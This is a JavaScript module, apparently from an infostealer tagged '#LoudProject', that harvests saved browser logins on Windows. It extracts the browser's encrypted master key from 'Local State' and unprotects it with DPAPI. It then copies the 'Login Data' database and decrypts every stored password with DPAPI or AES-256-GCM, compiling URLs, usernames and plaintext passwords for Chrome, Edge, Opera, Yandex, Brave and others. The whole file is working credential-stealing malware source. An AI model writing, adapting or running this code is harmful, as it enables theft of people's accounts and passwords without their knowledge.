const Dpapi = require("node-dpapi-prebuilt");
const fs = require("fs");
const crypto = require("crypto");
const sqlite3 = require("sqlite3");
let { state } = require("../../data/data");
const appdata = process.env.LOCALAPPDATA || "";

async function getPasswords(path) {
  const path_split = path.split("\\");
  const path_split_tail = path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
  let path_tail = path_split_tail.join("\\") + "\\";

  if (!path.startsWith(appdata)) path_tail = path;
  if (path.includes("cord")) return;
  if (!fs.existsSync(path_tail)) return;

  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "\\Local State")).os_crypt.encrypted_key, "base64").subarray(5);
  const login_data = path + "Login Data";
  const passwords_db = path + "passwords.db";

  fs.copyFileSync(login_data, passwords_db);

  if (passwords_db.includes("Chrome") && !state.passwordsBrowserUsed.has("Chrome")) {
    state.passwordsBrowserUsed.add("Chrome");
  } else if (passwords_db.includes("Firefox") && !state.passwordsBrowserUsed.has("Firefox")) {
    state.passwordsBrowserUsed.add("Firefox");
  } else if (passwords_db.includes("Edge") && !state.passwordsBrowserUsed.has("Edge")) {
    state.passwordsBrowserUsed.add("Edge");
  } else if (passwords_db.includes("Opera") && !state.passwordsBrowserUsed.has("Opera")) {
    state.passwordsBrowserUsed.add("Opera");
  } else if (passwords_db.includes("Firefox") && !state.passwordsBrowserUsed.has("Firefox")) {
    state.passwordsBrowserUsed.add("Firefox");
  } else if (passwords_db.includes("Yandex") && !state.passwordsBrowserUsed.has("Yandex")) {
    state.passwordsBrowserUsed.add("Yandex");
  } else if (passwords_db.includes("Brave") && !state.passwordsBrowserUsed.has("Brave")) {
    state.passwordsBrowserUsed.add("Brave");
  }

  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
  let result = `\n\nPASSWORDS FROM: ${path} #LoudProject`;

  const sql = new sqlite3.Database(passwords_db, (err) => {
    if (err) {
    }
  });

  const pizza = await new Promise((resolve) => {
    sql.each(
      "SELECT origin_url, username_value, password_value FROM logins",
      function (err, row) {
        if (err || !row["username_value"]) return;

        const password_value = row["password_value"];

        try {
          if (password_value[0] == 1 && password_value[1] == 0 && password_value[2] == 0 && password_value[3] == 0) {
            const decrypted = Dpapi.unprotectData(password_value, null, "CurrentUser").toString("utf-8");
            allPasswords.push(decrypted);

            state.passwordCount.value++;
            result += "\nURL: " + row["origin_url"] + " | USERNAME: " + row["username_value"] + " | PASSWORD: " + decrypted;
          } else {
            const start = password_value.slice(3, 15);
            const middle = password_value.slice(15, password_value.length - 16);
            const end = password_value.slice(password_value.length - 16, password_value.length);
            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

            decipher.setAuthTag(end);

            const decrypted = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
            allPasswords.push(decrypted);

            result += "\nURL: " + row["origin_url"] + " | USERNAME: " + row["username_value"] + " | PASSWORD: " + decrypted;
            state.passwordCount.value++;
          }
        } catch {}
      },
      function () {
        resolve(result);
      }
    );
  });

  return pizza;
}


module.exports = { getPasswords };
